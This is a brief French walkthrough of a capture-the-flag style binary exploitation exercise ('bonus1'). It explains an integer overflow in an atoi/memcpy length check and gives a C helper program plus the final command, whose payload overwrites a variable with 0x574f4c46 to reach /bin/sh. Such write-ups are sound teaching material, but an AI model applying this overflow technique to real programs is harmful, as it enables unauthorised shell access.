The programm segfault sans argument, et return avec un argument.

Avec ltrace on voit un appel a atoi qui attends un chiffre negatif pour ensuite faire un memcpy.

Il faut regarder l'assembleur et decompiler avec jira pour comprendre ce qu'on attends de nous.

En fait il faut passer plusieurs checks pour arriver dans un appel a /bin/sh.

Pour commencer on cherche en premiere parametre un chiffre negatif qui est egal a 44 quand multiplie par 4 a cause des limit int_max et int_min

O a besoin d'un petit programme pour ca.

#include <stdio.h>

int main(int argc, char *argv[]){
        signed int neg = -1;
        while((neg * 4) != 44 ){
                neg--;
        }
        printf("%d\n",neg);
        //
	printf("%d\n",neg << 2);
} >> on trouve -1073741813

Pourquoi 44 ? On veut ecrire dans un buffer de 40, + 4 pour ecrire dans sur ce nombre -1073741813 la valeur demande par le deuxieme check :

if (number == 0x574f4c46(1464814662 en int))
 0x08048478 <+84>:	cmpl   $0x574f4c46,0x3c(%esp)

On mets en little endian la valeur  1464814662 = 0x574f4c46
./bonus1 -1073741813 $(python -c 'print "\x90" * 40 + "\x46\x4c\x4f\x57"')